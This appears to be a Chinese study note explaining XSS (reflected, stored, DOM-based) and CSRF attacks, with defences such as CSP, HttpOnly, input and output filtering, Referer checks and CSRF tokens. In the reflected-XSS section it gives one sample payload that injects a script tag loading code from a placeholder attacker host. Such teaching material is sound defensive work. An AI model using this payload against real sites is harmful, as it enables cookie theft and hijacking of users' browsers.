## XSS 和 CSRF
### XSS
- XSS，即 Cross Site Script，中译是跨站脚本攻击；其原本缩写是 CSS，但为了和层叠样式表(Cascading Style Sheet)有所区分，因而在安全领域叫做 XSS。

- XSS 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。

- 攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。

- XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。

#### 反射型
- 反射型攻击是指用户提交恶意代码给服务器，服务器又将恶意代码反射给浏览器端，例如在url请求中加上script代码，那么浏览器在访问相应url时就会执行恶意代码
```html
<a href ="http://www.****.com?x=<script src = http://攻击者网站/hacker.js />诱惑文本</a>
```
- 发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务器解析后响应，XSS代码随着响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫做反射型XSS。

#### 存储型

- 存储型 XSS 会把用户输入的数据 "存储" 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。

- 比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。

#### 基于DOM
- 基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。

### XSS 攻击的防范
现在主流的浏览器内置了防范 XSS 的措施，例如 CSP。但对于开发者来说，也应该寻找可靠的解决方案来防止 XSS 攻击。
https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP

* HttpOnly 防止劫取 Cookie
* 输入检查 - 不要相信用户的任何输入。 对于用户的任何输入要进行检查、过滤和转义。建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。在 XSS 防御中，输入检查一般是检查用户输入的数据中是否包含 <，> 等特殊字符，如果存在，则对特殊字符进行过滤或编码，这种方式也称为 XSS Filter。

* 输出检查
用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。


### CSRF
- CSRF，即 Cross Site Request Forgery，中译是跨站请求伪造，是一种劫持受信任用户向服务器发送非预期请求的攻击方式。

- 通常情况下，CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。

### CSRF防御的常规思路
- 验证HTTP Referer字段，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求其referer需要来自同一个网站，比如需要访问'http://bank.example/withdraw?account=bob&amount=1000000&for=hack'，用户需要先登陆到bank.example,然后通过页面的转账按钮来触发转账事件。这时，该请求的referer值就是按钮所在的那个页面的url。但是如果黑客要实施CSRF攻击的话，referer的值就会是黑客所搭建的那个网站的url，而一经银行的服务器验证是站外请求，就会直接拒绝，从而防御CSRF攻击。

- 在请求地址中添加token并验证 - CSRF能够成功完全是因为黑客能够伪造用户的请求，在该请求中所有的用户验证信息都存在于cookie中，因此黑客才可以利用cookie来通过安全验证。要抵御CSRF，关键在于在请求中放入黑客不能伪造的信息，并且该信息不存在在cookie中。那么我们就可以在HTTP请求中以参数的形式加入一个随机生成的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或token的内容的不正确，则认为不安全从而直接拒绝该请求。(一般是服务器端生成的)

- 在HTTP头中自定义属性并验证,这里也是使用token并进行验证，和上一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求中去，而是把它放到HTTP投中自定义的属性里。